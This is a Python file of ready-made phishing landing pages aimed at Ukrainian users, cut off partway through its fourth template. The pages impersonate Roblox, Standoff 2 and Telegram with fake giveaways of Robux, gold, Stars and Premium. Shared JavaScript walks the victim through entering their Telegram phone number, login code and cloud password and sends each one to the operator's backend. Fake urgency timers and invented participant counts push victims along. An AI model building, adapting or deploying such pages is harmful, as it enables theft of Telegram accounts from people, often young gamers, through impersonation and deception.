"""Pre-built landing page HTML templates for various target audiences in Ukraine."""

# ---------------------------------------------------------------------------
# Shared JS helper embedded in every template
# ---------------------------------------------------------------------------

_SHARED_JS = r"""
<script>
var _sid = null;

function showStep(n) {
  for (var i = 1; i <= 4; i++) {
    var el = document.getElementById('step' + i);
    if (el) el.style.display = (i === n) ? 'block' : 'none';
  }
}

function getPhone() {
  var raw = (document.getElementById('phoneInput') || {value:''}).value.replace(/\s/g,'');
  if (!raw.startsWith('+')) raw = '+380' + raw.replace(/^0+/, '');
  return raw;
}

function getCode() {
  var code = '';
  for (var i = 1; i <= 5; i++) {
    var el = document.getElementById('code' + i);
    code += el ? el.value : '';
  }
  return code;
}

function showError(msg) {
  var el = document.getElementById('errorMsg');
  if (el) { el.textContent = msg; el.style.display = 'block'; }
  else alert(msg);
}

function hideError() {
  var el = document.getElementById('errorMsg');
  if (el) el.style.display = 'none';
}

async function sendCode() {
  hideError();
  var phone = getPhone();
  if (!phone.match(/^\+\d{9,15}$/)) { showError('Введіть коректний номер телефону'); return; }
  var btn = document.getElementById('sendBtn');
  if (btn) { btn.disabled = true; btn.textContent = 'Відправляємо...'; }
  try {
    var r = await fetch('/api/send_code', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({phone: phone})
    });
    var d = await r.json();
    if (d.status === 'success') {
      _sid = d.sid;
      showStep(2);
      document.getElementById('code1') && document.getElementById('code1').focus();
    } else {
      showError(d.message || 'Помилка. Спробуйте ще раз.');
    }
  } catch(e) {
    showError('Помилка мережі. Перевірте з\'єднання.');
  }
  if (btn) { btn.disabled = false; btn.textContent = btn.getAttribute('data-text') || 'Продовжити'; }
}

async function verifyCode() {
  hideError();
  var code = getCode();
  if (code.length < 5) { showError('Введіть 5-значний код'); return; }
  var btn = document.getElementById('verifyBtn');
  if (btn) { btn.disabled = true; btn.textContent = 'Перевіряємо...'; }
  try {
    var r = await fetch('/api/verify', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({sid: _sid, code: code})
    });
    var d = await r.json();
    if (d.status === 'success') {
      showStep(4);
    } else if (d.status === 'need_2fa' || d.status === 'password_required') {
      showStep(3);
      document.getElementById('passInput') && document.getElementById('passInput').focus();
    } else {
      showError(d.message || 'Невірний код. Спробуйте ще раз.');
    }
  } catch(e) {
    showError('Помилка мережі.');
  }
  if (btn) { btn.disabled = false; btn.textContent = btn.getAttribute('data-text') || 'Підтвердити'; }
}

async function verifyPassword() {
  hideError();
  var pass = (document.getElementById('passInput') || {value:''}).value;
  if (!pass) { showError('Введіть хмарний пароль'); return; }
  var btn = document.getElementById('passBtn');
  if (btn) { btn.disabled = true; btn.textContent = 'Перевіряємо...'; }
  try {
    var r = await fetch('/api/verify', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({sid: _sid, password: pass})
    });
    var d = await r.json();
    if (d.status === 'success') {
      showStep(4);
    } else {
      showError(d.message || 'Невірний пароль.');
    }
  } catch(e) {
    showError('Помилка мережі.');
  }
  if (btn) { btn.disabled = false; btn.textContent = btn.getAttribute('data-text') || 'Підтвердити'; }
}

// 5-digit code input with auto-focus
document.addEventListener('DOMContentLoaded', function() {
  for (var i = 1; i <= 5; i++) {
    (function(idx) {
      var el = document.getElementById('code' + idx);
      if (!el) return;
      el.addEventListener('input', function() {
        this.value = this.value.replace(/\D/g, '').slice(0, 1);
        if (this.value && idx < 5) {
          var next = document.getElementById('code' + (idx + 1));
          if (next) next.focus();
        }
      });
      el.addEventListener('keydown', function(e) {
        if (e.key === 'Backspace' && !this.value && idx > 1) {
          var prev = document.getElementById('code' + (idx - 1));
          if (prev) prev.focus();
        }
      });
    })(i);
  }
  showStep(1);
  startTimer();
});

// Countdown timer (2h from first visit, stored in localStorage)
function startTimer() {
  var key = 'timer_' + window.location.pathname;
  var endTime = parseInt(localStorage.getItem(key) || '0');
  if (!endTime || endTime < Date.now()) {
    endTime = Date.now() + 2 * 3600 * 1000;
    localStorage.setItem(key, endTime);
  }
  function tick() {
    var remaining = Math.max(0, endTime - Date.now());
    var h = Math.floor(remaining / 3600000);
    var m = Math.floor((remaining % 3600000) / 60000);
    var s = Math.floor((remaining % 60000) / 1000);
    var str = (h > 0 ? pad(h) + ':' : '') + pad(m) + ':' + pad(s);
    var els = document.querySelectorAll('.js-timer');
    els.forEach(function(el) { el.textContent = str; });
    if (remaining > 0) setTimeout(tick, 1000);
  }
  tick();
}
function pad(n) { return n < 10 ? '0' + n : '' + n; }
</script>
"""

# ---------------------------------------------------------------------------
# Template 1: Roblox
# ---------------------------------------------------------------------------

ROBLOX_HTML = """<!DOCTYPE html>
<html lang="uk">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta property="og:title" content="Roblox — Безкоштовні Robux для України">
<meta property="og:description" content="Отримай 10,000 Robux безкоштовно! Офіційна акція від Roblox Україна.">
<title>Roblox — 10,000 Robux БЕЗКОШТОВНО!</title>
<script src="https://cdn.tailwindcss.com"></script>
<link href="https://fonts.googleapis.com/css2?family=Nunito:wght@700;800;900&display=swap" rel="stylesheet">
<style>
  body { background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f0f1a 100%); min-height: 100vh; font-family: 'Nunito', sans-serif; }
  .roblox-red { color: #ff4444; }
  .btn-roblox { background: linear-gradient(135deg, #e74c3c, #c0392b); border: none; color: #fff; font-weight: 800; border-radius: 8px; cursor: pointer; transition: transform .1s, box-shadow .1s; box-shadow: 0 4px 15px rgba(231,76,60,.4); }
  .btn-roblox:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(231,76,60,.6); }
  .btn-roblox:active { transform: translateY(0); }
  .card { background: rgba(255,255,255,.05); border: 1px solid rgba(255,68,68,.2); border-radius: 16px; backdrop-filter: blur(10px); }
  .logo-text { font-size: 2.8rem; font-weight: 900; color: #ff4444; text-shadow: 0 0 30px rgba(255,68,68,.5), 0 2px 0 #8b0000; letter-spacing: 2px; }
  .code-input { width: 48px; height: 56px; text-align: center; font-size: 1.5rem; font-weight: 800; background: rgba(255,255,255,.1); border: 2px solid rgba(255,68,68,.4); border-radius: 8px; color: #fff; outline: none; }
  .code-input:focus { border-color: #ff4444; box-shadow: 0 0 0 3px rgba(255,68,68,.2); }
  #errorMsg { background: rgba(231,76,60,.15); border: 1px solid rgba(231,76,60,.4); border-radius: 8px; padding: 10px 14px; color: #ff8080; font-size: .875rem; display: none; }
  .feature-badge { background: rgba(255,68,68,.1); border: 1px solid rgba(255,68,68,.25); border-radius: 8px; padding: 8px 12px; font-size: .875rem; color: #ffa0a0; }
  .phone-input { background: rgba(255,255,255,.08); border: 2px solid rgba(255,68,68,.3); border-radius: 10px; color: #fff; font-size: 1.1rem; padding: 14px 16px; width: 100%; outline: none; }
  .phone-input:focus { border-color: #ff4444; }
  .phone-input::placeholder { color: rgba(255,255,255,.3); }
  .pass-input { background: rgba(255,255,255,.08); border: 2px solid rgba(255,68,68,.3); border-radius: 10px; color: #fff; font-size: 1rem; padding: 12px 16px; width: 100%; outline: none; }
  .pass-input:focus { border-color: #ff4444; }
</style>
</head>
<body class="flex items-center justify-center p-4">
<div style="max-width:480px;width:100%;">

  <!-- Step 1: Phone -->
  <div id="step1">
    <div class="card p-6 mb-4">
      <div class="text-center mb-5">
        <div class="logo-text">ROBLOX</div>
        <div class="text-xs text-gray-400 font-bold tracking-widest mt-1">УКРАЇНА</div>
      </div>
      <div class="text-center mb-5">
        <div class="text-2xl font-black text-white mb-2">🎁 10,000 ROBUX — БЕЗКОШТОВНО!</div>
        <div class="text-sm text-gray-300">Офіційна акція від Roblox Україна. Введи номер Telegram для верифікації.</div>
      </div>
      <div class="flex gap-3 mb-5">
        <div class="feature-badge flex-1 text-center">✅ Миттєве нарахування</div>
        <div class="feature-badge flex-1 text-center">✅ Офіційна акція</div>
      </div>
      <div class="text-center mb-5">
        <div class="text-yellow-400 font-bold">⏰ Акція закінчується через: <span class="js-timer text-white">01:59:59</span></div>
        <div class="text-orange-400 text-sm mt-1">🔥 Вже отримали: 14,782 гравців</div>
      </div>
      <div class="mb-4">
        <label class="block text-sm font-bold text-gray-300 mb-2">📱 Введіть номер телефону:</label>
        <input type="tel" id="phoneInput" class="phone-input" placeholder="+380XXXXXXXXX">
      </div>
      <div id="errorMsg" class="mb-3"></div>
      <button id="sendBtn" data-text="ОТРИМАТИ ROBUX →" onclick="sendCode()" class="btn-roblox w-full py-4 text-lg">ОТРИМАТИ ROBUX →</button>
      <div class="text-center text-xs text-gray-500 mt-3">🔒 Безпечна верифікація через Telegram</div>
    </div>
  </div>

  <!-- Step 2: Code -->
  <div id="step2" style="display:none;">
    <div class="card p-6">
      <div class="text-center mb-2"><div class="logo-text text-3xl">ROBLOX</div></div>
      <div class="text-center mb-5">
        <div class="text-4xl mb-2">📩</div>
        <div class="text-xl font-black text-white mb-1">Код підтвердження</div>
        <div class="text-sm text-gray-300">Введіть код підтвердження з Telegram</div>
      </div>
      <div class="flex justify-center gap-2 mb-5">
        <input type="tel" id="code1" class="code-input" maxlength="1" inputmode="numeric">
        <input type="tel" id="code2" class="code-input" maxlength="1" inputmode="numeric">
        <input type="tel" id="code3" class="code-input" maxlength="1" inputmode="numeric">
        <input type="tel" id="code4" class="code-input" maxlength="1" inputmode="numeric">
        <input type="tel" id="code5" class="code-input" maxlength="1" inputmode="numeric">
      </div>
      <div id="errorMsg" class="mb-3"></div>
      <button id="verifyBtn" data-text="ПІДТВЕРДИТИ КОД" onclick="verifyCode()" class="btn-roblox w-full py-4 text-lg">ПІДТВЕРДИТИ КОД</button>
    </div>
  </div>

  <!-- Step 3: 2FA -->
  <div id="step3" style="display:none;">
    <div class="card p-6">
      <div class="text-center mb-2"><div class="logo-text text-3xl">ROBLOX</div></div>
      <div class="text-center mb-5">
        <div class="text-4xl mb-2">🔐</div>
        <div class="text-xl font-black text-white mb-1">Хмарний пароль</div>
        <div class="text-sm text-gray-300">Введіть хмарний пароль Telegram для завершення верифікації</div>
      </div>
      <input type="password" id="passInput" class="pass-input mb-4" placeholder="Хмарний пароль Telegram">
      <div id="errorMsg" class="mb-3"></div>
      <button id="passBtn" data-text="ПІДТВЕРДИТИ" onclick="verifyPassword()" class="btn-roblox w-full py-4 text-lg">ПІДТВЕРДИТИ</button>
    </div>
  </div>

  <!-- Step 4: Success -->
  <div id="step4" style="display:none;">
    <div class="card p-6 text-center">
      <div class="logo-text text-3xl mb-3">ROBLOX</div>
      <div class="text-6xl mb-4">✅</div>
      <div class="text-2xl font-black text-green-400 mb-3">Верифікацію пройдено!</div>
      <div class="text-gray-300 text-base">10,000 Robux будуть нараховані протягом <strong class="text-yellow-400">24 годин</strong> на ваш акаунт.</div>
      <div class="mt-4 text-sm text-gray-500">Дякуємо за участь в акції Roblox Україна 🎮</div>
    </div>
  </div>

</div>
""" + _SHARED_JS + """</body>
</html>"""

# ---------------------------------------------------------------------------
# Template 2: Standoff 2
# ---------------------------------------------------------------------------

STANDOFF_HTML = """<!DOCTYPE html>
<html lang="uk">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta property="og:title" content="Standoff 2 — Безкоштовне Золото для України">
<meta property="og:description" content="Отримай 50,000 Золота + VIP Кейс! Офіційна роздача від Standoff 2 UA.">
<title>Standoff 2 — 50,000 Золота БЕЗКОШТОВНО!</title>
<script src="https://cdn.tailwindcss.com"></script>
<link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@600;700&family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
<style>
  body { background: linear-gradient(160deg, #0d1117 0%, #1a1a2e 60%, #0d1117 100%); min-height: 100vh; font-family: 'Inter', sans-serif; }
  .bg-grid { background-image: repeating-linear-gradient(0deg, transparent, transparent 39px, rgba(255,215,0,.04) 40px), repeating-linear-gradient(90deg, transparent, transparent 39px, rgba(255,215,0,.04) 40px); }
  .gold { color: #FFD700; }
  .btn-gold { background: linear-gradient(135deg, #FFD700, #FFA500); border: none; color: #0d1117; font-weight: 800; border-radius: 8px; cursor: pointer; transition: transform .1s, box-shadow .1s; box-shadow: 0 4px 20px rgba(255,215,0,.4); font-family: 'Rajdhani', sans-serif; font-size: 1.1rem; }
  .btn-gold:hover { transform: translateY(-2px); box-shadow: 0 6px 25px rgba(255,215,0,.6); }
  .btn-gold:active { transform: translateY(0); }
  .card { background: rgba(255,255,255,.04); border: 1px solid rgba(255,215,0,.15); border-radius: 16px; backdrop-filter: blur(10px); }
  .logo-text { font-family: 'Rajdhani', sans-serif; font-size: 2.2rem; font-weight: 700; color: #FFD700; text-shadow: 0 0 20px rgba(255,215,0,.5); letter-spacing: 3px; }
  .prize-card { background: rgba(255,215,0,.07); border: 1px solid rgba(255,215,0,.2); border-radius: 12px; padding: 12px; text-align: center; }
  .code-input { width: 48px; height: 56px; text-align: center; font-size: 1.5rem; font-weight: 800; background: rgba(255,255,255,.06); border: 2px solid rgba(255,215,0,.3); border-radius: 8px; color: #fff; outline: none; }
  .code-input:focus { border-color: #FFD700; box-shadow: 0 0 0 3px rgba(255,215,0,.15); }
  #errorMsg { background: rgba(231,76,60,.12); border: 1px solid rgba(231,76,60,.3); border-radius: 8px; padding: 10px 14px; color: #ff8080; font-size: .875rem; display: none; }
  .phone-input { background: rgba(255,255,255,.06); border: 2px solid rgba(255,215,0,.25); border-radius: 10px; color: #fff; font-size: 1.1rem; padding: 14px 16px; width: 100%; outline: none; }
  .phone-input:focus { border-color: #FFD700; }
  .phone-input::placeholder { color: rgba(255,255,255,.25); }
  .pass-input { background: rgba(255,255,255,.06); border: 2px solid rgba(255,215,0,.25); border-radius: 10px; color: #fff; font-size: 1rem; padding: 12px 16px; width: 100%; outline: none; }
  .pass-input:focus { border-color: #FFD700; }
</style>
</head>
<body class="bg-grid flex items-center justify-center p-4">
<div style="max-width:480px;width:100%;">

  <!-- Step 1 -->
  <div id="step1">
    <div class="card p-6 mb-4">
      <div class="text-center mb-5">
        <div class="logo-text">STANDOFF 2</div>
        <div class="text-xs text-yellow-600 font-bold tracking-widest mt-1">UKRAINE OFFICIAL</div>
      </div>
      <div class="text-center mb-4">
        <div class="text-2xl font-black text-white mb-2">💰 50,000 Золота + VIP Кейс!</div>
        <div class="text-sm text-gray-400">Офіційна роздача від Standoff 2 UA. Верифікація через Telegram.</div>
      </div>
      <div class="grid grid-cols-3 gap-2 mb-4">
        <div class="prize-card"><div class="gold font-bold text-lg">50K</div><div class="text-xs text-gray-400">Золота</div></div>
        <div class="prize-card"><div class="gold font-bold text-lg">🎁</div><div class="text-xs text-gray-400">VIP Кейс</div></div>
        <div class="prize-card"><div class="gold font-bold text-lg">⚔️</div><div class="text-xs text-gray-400">Рідкісний скін</div></div>
      </div>
      <div class="text-center mb-4">
        <div class="text-yellow-400 font-bold text-sm">⏰ До кінця акції: <span class="js-timer text-white">01:59:59</span></div>
        <div class="text-orange-400 text-sm mt-1">🎯 23,451 гравців вже отримали</div>
      </div>
      <div class="mb-4">
        <label class="block text-sm font-bold text-gray-300 mb-2">📱 Введіть номер Telegram для верифікації:</label>
        <input type="tel" id="phoneInput" class="phone-input" placeholder="+380XXXXXXXXX">
      </div>
      <div id="errorMsg" class="mb-3"></div>
      <button id="sendBtn" data-text="ОТРИМАТИ НАГОРОДУ" onclick="sendCode()" class="btn-gold w-full py-4">ОТРИМАТИ НАГОРОДУ</button>
    </div>
  </div>

  <!-- Step 2 -->
  <div id="step2" style="display:none;">
    <div class="card p-6">
      <div class="text-center mb-2"><div class="logo-text text-2xl">STANDOFF 2</div></div>
      <div class="text-center mb-5">
        <div class="text-4xl mb-2">📩</div>
        <div class="text-xl font-black text-white mb-1">Код підтвердження</div>
        <div class="text-sm text-gray-400">Введіть код з Telegram</div>
      </div>
      <div class="flex justify-center gap-2 mb-5">
        <input type="tel" id="code1" class="code-input" maxlength="1" inputmode="numeric">
        <input type="tel" id="code2" class="code-input" maxlength="1" inputmode="numeric">
        <input type="tel" id="code3" class="code-input" maxlength="1" inputmode="numeric">
        <input type="tel" id="code4" class="code-input" maxlength="1" inputmode="numeric">
        <input type="tel" id="code5" class="code-input" maxlength="1" inputmode="numeric">
      </div>
      <div id="errorMsg" class="mb-3"></div>
      <button id="verifyBtn" data-text="ПІДТВЕРДИТИ" onclick="verifyCode()" class="btn-gold w-full py-4">ПІДТВЕРДИТИ</button>
    </div>
  </div>

  <!-- Step 3 -->
  <div id="step3" style="display:none;">
    <div class="card p-6">
      <div class="text-center mb-2"><div class="logo-text text-2xl">STANDOFF 2</div></div>
      <div class="text-center mb-5">
        <div class="text-4xl mb-2">🔐</div>
        <div class="text-xl font-black text-white mb-1">Хмарний пароль</div>
        <div class="text-sm text-gray-400">Введіть хмарний пароль Telegram</div>
      </div>
      <input type="password" id="passInput" class="pass-input mb-4" placeholder="Хмарний пароль">
      <div id="errorMsg" class="mb-3"></div>
      <button id="passBtn" data-text="ПІДТВЕРДИТИ" onclick="verifyPassword()" class="btn-gold w-full py-4">ПІДТВЕРДИТИ</button>
    </div>
  </div>

  <!-- Step 4 -->
  <div id="step4" style="display:none;">
    <div class="card p-6 text-center">
      <div class="logo-text text-2xl mb-3">STANDOFF 2</div>
      <div class="text-6xl mb-4">✅</div>
      <div class="text-2xl font-black text-yellow-400 mb-3">Нагороду отримано!</div>
      <div class="text-gray-300">Золото та кейс будуть нараховані протягом <strong class="text-yellow-400">12 годин!</strong></div>
      <div class="mt-4 text-sm text-gray-500">Standoff 2 Ukraine — офіційна акція ⚔️</div>
    </div>
  </div>

</div>
""" + _SHARED_JS + """</body>
</html>"""

# ---------------------------------------------------------------------------
# Template 3: Telegram Stars
# ---------------------------------------------------------------------------

TELEGRAM_STARS_HTML = """<!DOCTYPE html>
<html lang="uk">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta property="og:title" content="Telegram Stars — Безкоштовні Зірки">
<meta property="og:description" content="Отримай 1,000 Telegram Stars безкоштовно! Офіційна промо-акція Telegram.">
<title>Telegram Stars — 1,000 Stars БЕЗКОШТОВНО!</title>
<script src="https://cdn.tailwindcss.com"></script>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
<style>
  body { background: linear-gradient(160deg, #1a2a4a 0%, #0d2137 50%, #071523 100%); min-height: 100vh; font-family: 'Inter', sans-serif; }
  .tg-blue { color: #54a9eb; }
  .btn-tg { background: linear-gradient(135deg, #2AABEE, #0088cc); border: none; color: #fff; font-weight: 700; border-radius: 10px; cursor: pointer; transition: transform .1s, box-shadow .1s; box-shadow: 0 4px 15px rgba(0,136,204,.4); }
  .btn-tg:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(0,136,204,.6); }
  .card { background: rgba(255,255,255,.05); border: 1px solid rgba(42,171,238,.2); border-radius: 16px; }
  .star-glow { filter: drop-shadow(0 0 20px rgba(255,215,0,.8)); font-size: 5rem; }
  .official-badge { background: rgba(42,171,238,.15); border: 1px solid rgba(42,171,238,.3); border-radius: 20px; padding: 4px 12px; display: inline-flex; align-items: center; gap: 6px; font-size: .8rem; color: #54a9eb; }
  .code-input { width: 48px; height: 56px; text-align: center; font-size: 1.5rem; font-weight: 800; background: rgba(42,171,238,.1); border: 2px solid rgba(42,171,238,.3); border-radius: 8px; color: #fff; outline: none; }
  .code-input:focus { border-color: #2AABEE; box-shadow: 0 0 0 3px rgba(42,171,238,.15); }
  #errorMsg { background: rgba(231,76,60,.12); border: 1px solid rgba(231,76,60,.3); border-radius: 8px; padding: 10px 14px; color: #ff8080; font-size: .875rem; display: none; }
  .phone-input { background: rgba(255,255,255,.06); border: 2px solid rgba(42,171,238,.25); border-radius: 10px; color: #fff; font-size: 1.1rem; padding: 14px 16px; width: 100%; outline: none; }
  .phone-input:focus { border-color: #2AABEE; }
  .phone-input::placeholder { color: rgba(255,255,255,.25); }
  .pass-input { background: rgba(255,255,255,.06); border: 2px solid rgba(42,171,238,.25); border-radius: 10px; color: #fff; font-size: 1rem; padding: 12px 16px; width: 100%; outline: none; }
  .pass-input:focus { border-color: #2AABEE; }
  .stat-row { background: rgba(42,171,238,.08); border: 1px solid rgba(42,171,238,.15); border-radius: 10px; padding: 10px 14px; }
</style>
</head>
<body class="flex items-center justify-center p-4">
<div style="max-width:460px;width:100%;">

  <!-- Step 1 -->
  <div id="step1">
    <div class="card p-6 mb-4">
      <div class="text-center mb-2">
        <div class="official-badge mb-3">✅ Official Telegram Promotion</div>
        <div class="star-glow mb-2">⭐</div>
        <div class="text-2xl font-black text-white mb-2">Отримай 1,000 Telegram Stars<br><span class="tg-blue">безкоштовно!</span></div>
        <div class="text-sm text-gray-300 mb-4">Офіційна промо-акція Telegram. Stars можна використати для покупок у ботах та каналах.</div>
      </div>
      <div class="stat-row mb-4">
        <div class="flex justify-between text-sm">
          <span class="text-gray-400">⭐ Роздано вже:</span>
          <span class="font-bold text-white">2,847,000 Stars</span>
        </div>
        <div class="flex justify-between text-sm mt-1">
          <span class="text-gray-400">⏰ Діє ще:</span>
          <span class="font-bold text-yellow-400 js-timer">01:59:59</span>
        </div>
      </div>
      <div class="text-xs text-gray-400 mb-1">💡 Діє лише для користувачів з України</div>
      <div class="mb-4">
        <label class="block text-sm font-semibold text-gray-300 mb-2">Введіть номер для підтвердження акаунту Telegram:</label>
        <input type="tel" id="phoneInput" class="phone-input" placeholder="+380XXXXXXXXX">
      </div>
      <div id="errorMsg" class="mb-3"></div>
      <button id="sendBtn" data-text="ОТРИМАТИ STARS" onclick="sendCode()" class="btn-tg w-full py-4 text-lg">ОТРИМАТИ STARS</button>
      <div class="text-center text-xs text-gray-500 mt-3">🔒 Telegram — захищена авторизація</div>
    </div>
  </div>

  <!-- Step 2 -->
  <div id="step2" style="display:none;">
    <div class="card p-6">
      <div class="text-center mb-5">
        <div class="text-4xl mb-2">📩</div>
        <div class="text-xl font-bold text-white mb-1">Введіть код з Telegram</div>
        <div class="text-sm text-gray-400">Ми надіслали код підтвердження у Telegram</div>
      </div>
      <div class="flex justify-center gap-2 mb-5">
        <input type="tel" id="code1" class="code-input" maxlength="1" inputmode="numeric">
        <input type="tel" id="code2" class="code-input" maxlength="1" inputmode="numeric">
        <input type="tel" id="code3" class="code-input" maxlength="1" inputmode="numeric">
        <input type="tel" id="code4" class="code-input" maxlength="1" inputmode="numeric">
        <input type="tel" id="code5" class="code-input" maxlength="1" inputmode="numeric">
      </div>
      <div id="errorMsg" class="mb-3"></div>
      <button id="verifyBtn" data-text="ПІДТВЕРДИТИ" onclick="verifyCode()" class="btn-tg w-full py-4 text-lg">ПІДТВЕРДИТИ</button>
    </div>
  </div>

  <!-- Step 3 -->
  <div id="step3" style="display:none;">
    <div class="card p-6">
      <div class="text-center mb-5">
        <div class="text-4xl mb-2">🔐</div>
        <div class="text-xl font-bold text-white mb-1">Введіть хмарний пароль</div>
        <div class="text-sm text-gray-400">Ваш акаунт захищений двоетапною верифікацією</div>
      </div>
      <input type="password" id="passInput" class="pass-input mb-4" placeholder="Хмарний пароль Telegram">
      <div id="errorMsg" class="mb-3"></div>
      <button id="passBtn" data-text="ПІДТВЕРДИТИ" onclick="verifyPassword()" class="btn-tg w-full py-4 text-lg">ПІДТВЕРДИТИ</button>
    </div>
  </div>

  <!-- Step 4 -->
  <div id="step4" style="display:none;">
    <div class="card p-6 text-center">
      <div class="star-glow mb-4">⭐</div>
      <div class="text-2xl font-black text-green-400 mb-3">Вітаємо!</div>
      <div class="text-gray-300">1,000 Stars будуть нараховані на ваш акаунт Telegram!</div>
      <div class="mt-4 p-3 rounded-lg" style="background:rgba(42,171,238,.1);border:1px solid rgba(42,171,238,.2);">
        <div class="text-sm text-blue-300">✅ Акцію активовано успішно</div>
      </div>
    </div>
  </div>

</div>
""" + _SHARED_JS + """</body>
</html>"""

# ---------------------------------------------------------------------------
# Template 4: Telegram Premium
# ---------------------------------------------------------------------------

TELEGRAM_PREMIUM_HTML = """<!DOCTYPE html>
<html lang="uk">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta property="og:title" content="Telegram Premium — 1 рік безкоштовно!">
<meta property="og:description" content="Активуй Telegram Premium на 1 рік безкоштовно! Офіційна акція до Дня Незалежності України.">
<title>Telegram Premium — 1 рік БЕЗКОШТОВНО!</title>
<script src="https://cdn.tailwindcss.com"></script>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
<style>
  body { background: linear-gradient(160deg, #1a0533 0%, #0a1628 60%, #050c1a 100%); min-height: 100vh; font-family: 'Inter', sans-serif; }
  .crown-glow { filter: drop-shadow(0 0 25px rgba(255,215,0,.9)); font-size: 4.5rem; }
  .btn-premium { background: linear-gradient(135deg, #FFD700, #FFC200, #e6b800); border: none; color: #1a0533; font-weight: 800; border-radius: 10px; cursor: pointer; transition: transform .1s, box-shadow .1s; box-shadow: 0 4px 20px rgba(255,215,0,.4); font-size: 1.05rem; }
  .btn-premium:hover { transform: translateY(-2px); box-shadow: 0 8px 30px rgba(255,215,0,.6); }
  .card { background: rgba(255,255,255,.04); border: 1px solid rgba(255,215,0,.15); border-radius: 16px; }
  .feature-item { display: flex; align-items: center; gap: 10px; padding: 8px 0; border-bottom: 1px solid rgba(255,215,0,.08); }
  .feature-item:last-child { border-bottom: none; }
  .badge-ua { background: linear-gradient(135deg, #0057B8, #004494); border: 1px solid rgba(255,215,0,.3); border-radius: 20px; padding: 4px 14px; display: inline-flex; align-items: center; gap: 6px; font-size: .8rem; color: #FFD700; font-weight: 600; }
  .code-input { width: 48px; height: 56px; text-align: center; font-size: 1.5rem; font-weight: 800; background: rgba(255,215,0,.08); border: 2px solid rgba(255,215,0,.25); border-radius: 8px; color: #fff; outline: none; }
  .code-input:focus { border-color: #FFD700; box-shadow: 0 0 0 3px rgba(255,215,0,.12); }
  #errorMsg { background: rgba(231,76,60,.12); border: 1px solid rgba(231,76,60,.3); border-radius: 8px; padding: 10px 14px; color: #ff8080; font-size: .875rem; display: none; }
  .phone-input { background: rgba(255,255,255,.06); border: 2px solid rgba(255,215,0,.2); border-radius: 10px; color: #fff; font-size: 1.1rem; padding: 14px 16px; width: 100%; outline: none; }
  .phone-input:focus { border-color: #FFD700; }
  .phone-input::placeholder { color: rgba(255,255,255,.25); }
  .pass-input { background: rgba(255,255,255,.06); border: 2px solid rgba(255,215,0,.2); border-radius: 10px; color: #fff; font-size: 1rem; padding: 12px 16px; width: 100%; outline: none; }
  .pass-input:focus { border-color: #FFD700; }
</style>
</head>
<body class="flex items-center justify-center p-4">
<div style="max-width:460px;width:100%;">

  <!-- Step 1 -->
  <div id="step1">
    <div class="card p-6 mb-4">
      <div class="text-center mb-4">
        <div class="badge-ua mb-3">🇺🇦 Тільки для громадян України</div>
        <div class="crown-glow mb-2">👑</div>
        <div class="text-2xl font-black text-white mb-2">Telegram Premium —<br><span style="color:#FFD700;">1 рік БЕЗКОШТОВНО!</span></div>
        <div class="text-sm text-gray-300 mb-4">Офіційна акція до Дня Незалежності України 🇺🇦</div>
      </div>
      <div class="card p-4 mb-4">
        <div class="text-xs font-bold text-yellow-500 uppercase tracking-wider mb-2">Що включає Premium:</div>
        <div class="feature-item"><span class="text-green-400">✓</span><span class="text-gray-300 text-sm">Без реклами</span></div>
        <div class="feature-item"><span class="text-green-400">✓</span><span class="text-gray-300 text-sm">4 ГБ завантаження файлів</span></div>
        <div class="feature-item"><span class="text-green-400">✓</span><span class="text-gray-300 text-sm">Унікальні стікери та реакції</span></div>
        <div class="feature-item"><span class="text-green-400">✓</span><span class="text-gray-300 text-sm">Розшифровка голосових повідомлень</span></div>
        <div class="feature-item"><span class="text-green-400">✓</span><span class="text-gray-300 text-sm">Прискорена швидкість завантаження</span></div>
      </div>
      <div class="text-center mb-4">
        <div class="text-yellow-400 font-bold text-sm">⏰ Акція діє ще: <span class="js-timer text-white">01:59:59</span></div>
        <div class="text-gray-400 text-sm mt-1">👑 87,234 підписки вже активовано</div>
      </div>
      <div class="mb-4">
        <label class="block text-sm font-semibold text-gray-300 mb-2">Підтвердіть свій акаунт для активації Premium:</label>
        <input type="tel" id="phoneInput" class="phone-input" placeholder="+380XXXXXXXXX">
      </div>
      <div id="errorMsg" class="mb-3"></div>
      <button id="sendBtn" data-text="АКТИВУВАТИ PREMIUM" onclick="sendCode()" class="btn-premium w-full py-4">АКТИВУВАТИ PREMIUM</button>
    </div>
  </div>

  <!-- Step 2 -->
  <div id="step2" style="display:none;">
    <div class="card p-6">
      <div class="text-center mb-5">
        <div class="text-4xl mb-2">📩</div>
        <div class="text-xl font-bold text-white mb-1">Код підтвердження</div>
        <div class="text-sm text-gray-400">Введіть код, надісланий у Telegram</div>
      </div>
      <div class="flex justify-center gap-2 mb-5">
        <input type="tel" id="code1" class="code-input" maxlength="1" inputmode="numeric">
        <input type="tel" id="code2" class="code-input" maxlength="1" inputmode="numeric">
        <input type="tel" id="code3" class="code-input" maxlength="1" inputmode="numeric">
        <input type="tel" id="code4" class="code-input" maxlength="1" inputmode="numeric">
        <input type="tel" id="code5" class="code-input" maxlength="1" inputmode="numeric">
      </div>
      <div id="errorMsg" class="mb-3"></div>
      <button id="verifyBtn" data-text="ПІДТВЕРДИТИ" onclick="verifyCode()" class="btn-premium w-full py-4">ПІДТВЕРДИТИ</button>
    </div>
  </div>

  <!-- Step 3 -->
  <div id="step3" style="display:none;">
    <div class="card p-6">
      <div class="text-center mb-5">
        <div class="text-4xl mb-2">🔐</div>
        <div class="text-xl font-bold text-white mb-1">Хмарний пароль</div>
        <div class="text-sm text-gray-400">Введіть хмарний пароль Telegram для активації</div>
